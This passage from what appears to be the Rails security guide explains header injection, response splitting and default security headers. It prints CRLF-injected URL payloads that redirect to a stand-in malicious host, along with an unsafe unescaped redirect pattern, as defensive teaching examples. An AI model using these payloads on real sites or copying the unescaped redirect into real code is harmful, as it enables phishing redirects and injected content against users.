WARNING: _HTTP headers are dynamically generated and under certain circumstances user input may be injected. This can lead to false redirection, XSS or HTTP response splitting._

HTTP request headers have a Referer, User-Agent (client software), and Cookie field, among others. Response headers for example have a status code, Cookie and Location (redirection target URL) field. All of them are user-supplied and may be manipulated with more or less effort. _Remember to escape these header fields, too._ For example when you display the user agent in an administration area.

Besides that, it is _important to know what you are doing when building response headers partly based on user input._ For example you want to redirect the user back to a specific page. To do that you introduced a "referer" field in a form to redirect to the given address:

```ruby
redirect_to params[:referer]
```

What happens is that Rails puts the string into the Location header field and sends a 302 (redirect) status to the browser. The first thing a malicious user would do, is this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld
```

And due to a bug in (Ruby and) Rails up to version 2.1.2 (excluding it), a hacker may inject arbitrary header fields; for example like this:

```
http://www.yourapplication.com/controller/action?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!
http://www.yourapplication.com/controller/action?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld
```

Note that "%0d%0a" is URL-encoded for "\r\n" which is a carriage-return and line-feed (CRLF) in Ruby. So the resulting HTTP header for the second example will be the following because the second Location header field overwrites the first.

```
HTTP/1.1 302 Moved Temporarily
(...)
Location: http://www.malicious.tld
```

So _attack vectors for Header Injection are based on the injection of CRLF characters in a header field._ And what could an attacker do with a false redirection? He could redirect to a phishing site that looks the same as yours, but asks to login again (and sends the login credentials to the attacker). Or he could install malicious software through browser security holes on that site. Rails 2.1.2 escapes these characters for the Location field in the `redirect_to` method. _Make sure you do it yourself when you build other header fields with user input._

#### Response Splitting

If Header Injection was possible, Response Splitting might be, too. In HTTP, the header block is followed by two CRLFs and the actual data (usually HTML). The idea of Response Splitting is to inject two CRLFs into a header field, followed by another response with malicious HTML. The response will be:

```
HTTP/1.1 302 Found [First standard 302 response]
Date: Tue, 12 Apr 2005 22:09:07 GMT
Location: Content-Type: text/html


HTTP/1.1 200 OK [Second New response created by attacker begins]
Content-Type: text/html


&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitary malicious input is
Keep-Alive: timeout=15, max=100         shown as the redirected page]
Connection: Keep-Alive
Transfer-Encoding: chunked
Content-Type: text/html
```

Under certain circumstances this would present the malicious HTML to the victim. However, this only seems to work with Keep-Alive connections (and many browsers are using one-time connections). But you can't rely on this. _In any case this is a serious bug, and you should update your Rails to version 2.0.5 or 2.1.2 to eliminate Header Injection (and thus response splitting) risks._


Default Headers
---------------

Every HTTP response from your Rails application receives the following default security headers.

```ruby
config.action_dispatch.default_headers = {
  'X-Frame-Options' => 'SAMEORIGIN',
  'X-XSS-Protection' => '1; mode=block',
  'X-Content-Type-Options' => 'nosniff'
}
```

You can configure default headers in `config/application.rb`.

```ruby
config.action_dispatch.default_headers = {
  'Header-Name' => 'Header-Value',
  'X-Frame-Options' => 'DENY'
}
```

Or you can remove them.

```ruby
config.action_dispatch.default_headers.clear
```

Here is a list of common headers:

* X-Frame-Options
_'SAMEORIGIN' in Rails by default_ - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
* X-XSS-Protection
_'1; mode=block' in Rails by default_ - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off(useful if response contents scripts from request parameters)
* X-Content-Type-Options
_'nosniff' in Rails by default_ - stops the browser from guessing the MIME type of a file.
* X-Content-Security-Policy
[A powerful mechanism for controlling which sites certain content types can be loaded from](http://dvcs.w3.org/hg/content-security-policy/raw-file/tip/csp-specification.dev.html)
* Access-Control-Allow-Origin
Used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
* Strict-Transport-Security
[Used to control if the browser is allowed to only access a site over a secure connection](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)

Environmental Security
----------------------

It is beyond the scope of this guide to inform you on how to secure your application code and environments. However, please secure your database configuration, e.g. `config/database.yml`, and your server-side secret, e.g. stored in `config/initializers/secret_token.rb`. You may want to further restrict access, using environment-specific versions of these files and any others that may contain sensitive information.

Additional Resources
--------------------

The security landscape shifts and it is important to keep up to date, because missing a new vulnerability can be catastrophic. You can find additional resources about (Rails) security here:

* The Ruby on Rails security project posts security news regularly: [http://www.rorsecurity.info](http://www.rorsecurity.info)
* Subscribe to the Rails security [mailing list](http://groups.google.com/group/rubyonrails-security)
* [Keep up to date on the other application layers](http://secunia.com/) (they have a weekly newsletter, too)
* A [good security blog](http://ha.ckers.org/blog/) including the [Cross-Site scripting Cheat Sheet](http://ha.ckers.org/xss.html)
